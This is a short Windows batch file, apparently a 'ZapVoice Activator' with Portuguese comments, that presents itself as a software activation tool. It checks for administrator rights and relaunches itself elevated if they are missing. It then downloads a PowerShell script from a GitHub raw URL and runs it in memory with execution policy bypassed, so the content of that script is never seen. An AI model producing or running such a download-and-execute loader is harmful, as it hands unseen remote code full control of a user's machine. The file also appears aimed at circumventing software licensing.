@echo off
title ZapVoice Activator v2.0

:: Verifica se ja esta rodando como Administrador
net session >nul 2>&1
if %errorlevel% == 0 goto :EXECUTAR

:: Nao e admin - relanca como admin
echo Solicitando permissao de Administrador...
powershell.exe -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c \"%~f0\"'"
exit /b

:EXECUTAR
:: Ja e admin - baixa e executa o script do GitHub
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Pugn0/zapvoice-activator/refs/heads/main/ZapVoice_System_Redirect.ps1' -UseBasicParsing).Content"